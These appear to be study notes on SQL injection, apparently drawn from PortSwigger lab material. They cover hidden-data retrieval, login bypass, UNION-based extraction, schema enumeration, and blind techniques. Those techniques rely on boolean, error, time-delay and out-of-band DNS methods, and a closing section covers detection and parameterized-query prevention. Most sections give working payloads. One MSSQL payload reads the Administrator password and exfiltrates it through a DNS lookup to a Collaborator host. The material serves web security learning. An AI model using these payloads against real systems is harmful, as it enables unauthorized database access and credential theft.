## What is SQLi?
SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to `view data` that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can `modify` or `delete` this data, causing persistent changes to the application's content or behavior.

**NOTE:** Different database uses different syntax. Visit [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Impact
- Unauthorized Access to database
- Persistent Backdoor

## Examples
- Retrieving hidden data
- Subverting application logic
- UNION attacks
- Examining the database
- Blind SQL injection

<hr />

## Retrieving hidden data
Think of  a URL request
`https://insecure-website.com/products?category=Gifts`

which results into execution of this SQL query
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
where release=1 could be thought as products which are release.

 Now the **attack** could be
`https://insecure-website.com/products?category=Gifts'--`

where
- `--` : Comment in SQL

which executes the folowing query
`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

Here after `--` everything is considered as comment so everything under category=Gifts will be retrieved no matter they are released or not.

<hr />

## Subverting application logic

Think of a poor logic code for login 
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`

where wiener and bluecheese are user provided input.

Now the **attack** could be
`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

which will not check for passwords as it's commented out according to query and will retrieve true for the useraccount = administrator

<hr >

## Union Attacks
In cases where the results of an SQL query are returned within the application's responses, an attacker can leverage an SQL injection vulnerability to retrieve data from other tables within the database.

To do this attack first we need to understand a rule about union operation.

i.e. `In the union operation, all the number of datatype and columns must be same in both the tables on which UNION operation is being applied.`

So when we try to retrieve data of other tables via SQLi we follow the approach:

1. **Determining the number of columns required in an SQL Injection UNION attack**

	`Method 1:` ORDER BY
	
	- ' ORDER BY 1--
	- ' ORDER BY 2--
	- ' ORDER BY 3--
	
	Where 1,2,3 are the column alias as retrived normally. We'll keep increasing the number till we receive an `error` i.e. we ORDERED the querry w.r.t to column which doesn't exists. Let's say we receive error at 3 then this assures us that 2 columns are there in the retrieved result.
	
	`Method 2:` UNION SELECT
	
	- ' UNION SELECT NULL--
	- ' UNION SELECT NULL,NULL--
	- ' UNION SELECT NULL,NULL,NULL--

	If the number of NULLS doesn't match the number of columns, the database returns an `error`.

	**Note: **
	- Why using NULL? 
	Since NULL is convertible to every commonly used data type.
	- On Oracle, every SELECT query must use the FROM keyword. Use `' UNION SELECT NULL FROM DUAL--` . Where DUAL is a inbuilt table in Oracle.
	- In MySQL, the double dash sequence must be followed by a space. Aternatively we can us #.
	 
 2. **Determining the datatype of columns**
	 - ' UNION SELECT 'a',NULL,NULL,NULL--
	 - UNION SELECT NULL,'a',NULL,NULL--
	 - UNION SELECT NULL,NULL,'a',NULL--
	 - UNION SELECT NULL,NULL,NULL,'a'--
	 
	 Here 'a' determines the string datatype. If the datatype of a column is not compatible with string data, the injected query will cause an `error`.
	 
 3. **Attack**
	 
	 Now we know the number of columns and the datatypes so its time to use UNION based SQLi. Assume we have a table named `users`  in database which has columns username and password. 
	 Also our normal SQL retrieves 2 columns with datatype string.
	 
	 So **attack** will look like 
	 `' UNION SELECT username, password FROM users--`
	 
	 Which results in query
	 ```
	 SELECT * FROM products WHERE category = '' UNION SELECT username, password FROM users--' AND released = 1
	 ```
	 
	 And retrieves usernames and passwords from DB.

	 **Special Case**
	 
	 What if we only have single column and wanna retrieve multiple values of another table?
	 
	 **attack**
	 `' UNION SELECT username || '~' || password FROM users--`

<hr />

## Examning the Database
When exploiting SQL injection vulnerabilities, it is often necessary to gather some information about the database itself.

Visit [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) for the syntaxes.

1. Database type and version
	
	Possible **attack** could be for MySQL or MSSQL
	`' UNION SELECT @@version--`

2. Listing Database Contents
	Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.
	
	We can query `SELECT * FROM information_schema.tables` to get the number and names of tables in DB(except Oracle). For Oracle visit  [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
	
	Then using `SELECT * FROM information_schema.columns WHERE table_name = 'Users'` we can querry a table schema.
	
	**Tip:** When you got limited number of columns make sure to retrieve the needed only. Like table_name or coulum_name. Do some googling on default column names.
	
<hr>

## Blind SQL injection

Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Think of a Cookie Header
`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

which does the following lookup 
`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

to decide whether to write `Welcome back` or not.

The possible **attack**
<hr />

`Method: 1` **Triggering conditional responses**

1. Checking for SQLi
`TrackingId=xyz' AND '1'='1` if returns Welcome back means the second condition is getting executed.

2. Lookup for table name user
`TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`

3. Lookup for password length of user=administrator
	```
	TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' 	AND LENGTH(password)>1)='a
	```

4. Lookup for password character wise
	```
	TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
	```

A point to understand here is that for step 2,3 and 4 we need to try and error and our path will be determined whether we reciving 'Welcome back' or not. Make use of repeater and intruder of burpsuit.

<hr  />

`Method: 2` **Inducing conditional responses by triggering SQL errors**

Now think of a situation we actually don't have any "welcome back" i.e. no ack.

Again we have a cookie header
`TrackingId=xyz`

**Note:** SQLi is always hit and try so first thing first know about what database we dealing with and then figure out what syntax to use.

Let's try it with single quote
`TrackingId=xyz'`  //Verify that error occured in response

Let's try with double quote
`TrackingId=xyz''` //Verify that error dissapears

This suggests that if there is a syntax error it will create error in web response("Our deriving force")

Now we need to confirm that these errors are only happining due to SQLi and not due to anything else :'') Kind of double check.

`TrackingId=xyz'||(SELECT '')||'`  // Now it still shows error. Let's try to manipulate it
`TrackingId=xyz'||(SELECT '' FROM dual)||'` and the error gone which states that we are dealing with Oracle.

And now we check once more with a invalid SQL query so that we can confirm that error happining from SQLi `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'` and error actually occured which enures.

Now let's introduce conditional 
`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` Now since 1=1 this executes 1 divided by 0 which gives invalid response.

Now let's optimize it and find for user=administrator
```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
if we get the error then it confirms that we have a user named administrator.

Now let's look for password length
```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Let's do characterwise password comparison
```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

<hr />

`Method: 3` **SQL injection by triggering time delays**

What if the error we getting previously is handled gracefully :'). 

Now since the SQL queries run **synchronously** so we could introduce a sleep mechanism :) something like while trying to compare character wise check and it holds true it goes to sleep for 10 sec. This will introduce delay in response time and we can filter out data.

First We need to determine DB
[Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) for Time Delays.

Once found we can move on for Conditional Time delays section in cheatsheet.

Like for postgreSQL 
```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

<hr />

`Method: 4` **Exploiting blind SQL injection using out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques**

What if the program carries out the queries **asynchronously**.

The application continues processing the user's request in the original thread, and uses another thread to execute an SQL query using the tracking cookie.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. As previously, these can be triggered conditionally, depending on an injected condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself.

The easiest and most reliable way to use out-of-band techniques is using [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator). This is a server that provides custom implementations of various network services (including DNS), and allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application.

The techniques for triggering a DNS query are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to cause a DNS lookup on a specified domain:

`'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`

This will cause the database to perform a lookup for the following domain:

`0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`

You can use Burp Suite's [Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client) to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.

Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:

`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`

This input reads the password for the `Administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This will result in a DNS lookup like the following, allowing you to view the captured password:

`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`

Out-of-band (OAST) techniques are an extremely powerful way to detect and exploit blind SQL injection, due to the highly likelihood of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.

<hr />

## How to detect?

-   Submitting the single quote character `'` and looking for errors or other anomalies.
-   Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
-   Submitting Boolean conditions such as `OR 1=1` and `OR 1=2, and` looking for differences in the application's responses.
-   Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.
-   Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions.

<hr />

## Prevention
Most instances of SQL injection can be prevented by using parameterized queries (also known as prepared statements) instead of string concatenation within the query.








	


